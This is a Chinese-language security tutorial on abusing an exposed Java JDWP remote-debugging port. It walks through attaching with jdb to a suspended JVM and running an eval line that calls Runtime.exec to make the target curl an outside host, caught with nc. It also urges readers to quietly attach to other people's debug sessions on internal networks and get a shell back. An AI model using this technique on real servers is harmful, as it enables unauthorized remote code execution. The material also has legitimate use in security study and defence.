# JDWP攻击示例

JPDA(`Java Platform Debugger Architecture`) 是 Java 平台调试体系结构的缩写，通过 JPDA 提供的 API，开发人员可以方便灵活的搭建 Java 调试应用程序。

大概在2015年左右用tangscan扫到了很几次jdwp服务端口，当时只是简单的测试过这个服务。

这个jdwp服务提供来对java程序调试的功能，只要有程序启动时使用了jdwp参数且端口绑定在内网或者共网上时候我们就可以利用这个服务来执行java代码片段弹shell。比较典型的有tomcat启动的时候如果是以jpda方式启动的话就会启动一个8000端口用于远程调试。

![img](https://oss.javasec.org/images/20190918164155_580.png)



假设我们需要远程调试一段Java程序，如Test.java的main方法：

![img](https://oss.javasec.org/images/20190918161911_104.png)

如果要远程调试我们就需要使用到远程调试参数，我们使用IDEA远程调试的时候会提示我们配置如下参数：

![img](https://oss.javasec.org/images/20190918161657_473.png)

所以我们只需要在执行:java Test 之前添加我们的调试参数即可。

首先在内网找一个测试环境，让他帮我们调试下这个Test.java，在启动的时候加上如下参数：

java -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=*:8003 Test

如下图：

![img](https://oss.javasec.org/images/20190918162359_476.png)

测试环境IP是：192.168.88.203，于是我们使用java自带的jdb(Java调试工具)来连接他的8003端口。

![img](https://oss.javasec.org/images/20190918162732_784.png)

jdb自带了很多命令，可以通过命令来查看各种调试信息，详情可以自己执行help命令查看。

```bash
** 命令列表 **
connectors                -- 列出此 VM 中可用的连接器和传输
 
run [class [args]]        -- 开始执行应用程序的主类
 
threads [threadgroup]     -- 列出线程
thread-- 设置默认线程
suspend [thread id(s)]    -- 挂起线程 (默认值: all)
resume [thread id(s)]     -- 恢复线程 (默认值: all)
where [| all] -- 转储线程的堆栈
wherei [| all]-- 转储线程的堆栈, 以及 pc 信息
up [n frames]             -- 上移线程的堆栈
down [n frames]           -- 下移线程的堆栈
kill-- 终止具有给定的异常错误对象的线程
interrupt-- 中断线程
 
print-- 输出表达式的值
dump-- 输出所有对象信息
eval-- 对表达式求值 (与 print 相同)
set=-- 向字段/变量/数组元素分配新值
locals                    -- 输出当前堆栈帧中的所有本地变量
 
classes                   -- 列出当前已知的类
class-- 显示已命名类的详细资料
methods-- 列出类的方法
fields-- 列出类的字段
 
threadgroups              -- 列出线程组
threadgroup-- 设置当前线程组
 
stop in.[(argument_type,...)]
                          -- 在方法中设置断点
stop at:-- 在行中设置断点
clear.[(argument_type,...)]
                          -- 清除方法中的断点
clear:-- 清除行中的断点
clear                     -- 列出断点
catch [uncaught|caught|all]|-- 出现指定的异常错误时中断
ignore [uncaught|caught|all]|-- 对于指定的异常错误, 取消 'catch'
watch [access|all].-- 监视对字段的访问/修改
unwatch [access|all].-- 停止监视对字段的访问/修改
trace [go] methods [thread]
                          -- 跟踪方法进入和退出。
                          -- 除非指定 'go', 否则挂起所有线程
trace [go] method exit | exits [thread]
                          -- 跟踪当前方法的退出, 或者所有方法的退出
                          -- 除非指定 'go', 否则挂起所有线程
untrace [methods]         -- 停止跟踪方法进入和/或退出
step                      -- 执行当前行
step up                   -- 一直执行, 直到当前方法返回到其调用方
stepi                     -- 执行当前指令
下一步                      -- 步进一行 (步过调用)
cont                      -- 从断点处继续执行
 
list [line number|method] -- 输出源代码
use (或 sourcepath) [source file path]
                          -- 显示或更改源路径
exclude [, ... | "none"]
                          -- 对于指定的类, 不报告步骤或方法事件
classpath                 -- 从目标 VM 输出类路径信息
 
monitor-- 每次程序停止时执行命令
monitor                   -- 列出监视器
unmonitor <monitor#>      -- 删除监视器
read-- 读取并执行命令文件
 
lock-- 输出对象的锁信息
threadlocks [thread id]   -- 输出线程的锁信息
 
pop                       -- 通过当前帧出栈, 且包含当前帧
reenter                   -- 与 pop 相同, 但重新进入当前帧
redefine-- 重新定义类的代码
 
disablegc-- 禁止对象的垃圾收集
enablegc-- 允许对象的垃圾收集
 
!!                        -- 重复执行最后一个命令-- 将命令重复执行 n 次
#-- 放弃 (无操作)
help (或 ?)               -- 列出命令
version                   -- 输出版本信息
exit (或 quit)            -- 退出调试器: 带有程序包限定符的完整类名: 带有前导或尾随通配符 ('*') 的类名: 'threads' 命令中报告的线程编号: Java(TM) 编程语言表达式。
支持大多数常见语法。
 
可以将启动命令置于 "jdb.ini" 或 ".jdbrc" 中
位于 user.home 或 user.dir 中</monitor#>
```

因为他使用的是暂停模式，所以我们可以直接在jdb中执行stepi命令来执行当前指令，否则我们需要使用stop 命令来设置断点了，然后我们就可以使用eval或者print指令来调用Runtime去执行系统命令：`eval java.lang.Runtime.getRuntime().exec("curl p2j.cn:8003").getInputStream())`

![img](https://oss.javasec.org/images/20190918163235_140.png)

我们需要在远程服务器上nc下8003端口即可接收受攻击的机器curl过来的请求：

![img](https://oss.javasec.org/images/20190918163600_499.png)

也就是说我们可以在别人debug的时候使用jdb attach进去然后悄无声息的弹个shell回来玩了，这种场景在内网通常是比较常见的遇到这个服务的时候记得试试吧。

jdb参考资料：

[http://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html](https://docs.oracle.com/javase/7/docs/technotes/tools/windows/jdb.html)

https://www.javatpoint.com/jdb-expression

https://www.tutorialspoint.com/jdb/jdb_quick_guide.htm
